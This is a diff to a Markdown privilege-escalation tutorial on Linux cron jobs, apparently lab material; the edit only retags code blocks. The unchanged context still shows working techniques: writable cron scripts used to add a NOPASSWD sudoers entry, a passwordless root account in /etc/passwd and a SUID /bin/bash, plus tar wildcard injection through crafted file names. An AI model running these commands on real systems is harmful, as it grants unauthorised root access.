@@ -50,7 +50,7 @@ Cron jobs also permit the use of special strings to schedule tasks at specific t
 
 Let's look at a few examples of cron jobs given the syntax above:
 
-```console
+```text
 0 0 * * 0 root /script.sh           # Execute script.sh every Sunday at midnight
 0 2,14 * * * root /script.sh        # Execute script.sh twice a day at 2AM and 2PM
 */15 * * * * root /script.sh        # Execute script.sh every 15 minutes
@@ -82,17 +82,17 @@ Let's open the file in *nano* to see what it does.
 
 Here we see a simple shell script which deletes the contents of the `/tmp` folder. At this stage, we have many options on how we approach privilege escalation. For example, we can grant ourselves superuser privileges by adding the low privileged user to `/etc/sudoers`.
 
-```console
+```text
 echo "user3 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 ```
 We can also add a new root user to the `/etc/passwd` using:
 
-```console
+```text
 echo "newrootuser::0:0:newrootuser:/root:/bin/bash" >> /etc/passwd
 ```
 Alternatively, we could simply set the SUID bit on the `/bin/bash` binary to gain root privileges. Let's take this approach. With the script open in nano, we can append the following line to set the SUID bit on the `/bin/bash` binary:
 
-```console
+```text
 chmod u+s /bin/bash
 ```
 ![Set SUID](../../assets/images/crontab/05%20-%20target_script_modified.png)
@@ -131,7 +131,7 @@ Let's explore an example where we exploit a weakness in the *tar* utility. Tar i
 
 When the *tar* utility is used with a wildcard, the utility will sift through all the files in the specified directory in an effort to archive them. We can exploit this by creating two files in the specified directory with the following names:
 
-```console
+```text
 --checkpoint=1
 --checkpoint-action=exec=<COMMAND_TO_EXECUTE>
 ```
@@ -145,7 +145,7 @@ Since *user3* owns the directory in question, we can write files to the director
 
 Next we create the following two files which will server as our arguments when the *tar* utility indexes the directory. Here we want to ensure that when the checkpoint condition is satisfied, the utility executes our shell script.
 
-```console
+```text
 touch /home/user3/Documents/--checkpoint=1
 touch '/home/user3/Documents/--checkpoint-action=exec=sh privesc.sh'
 ```
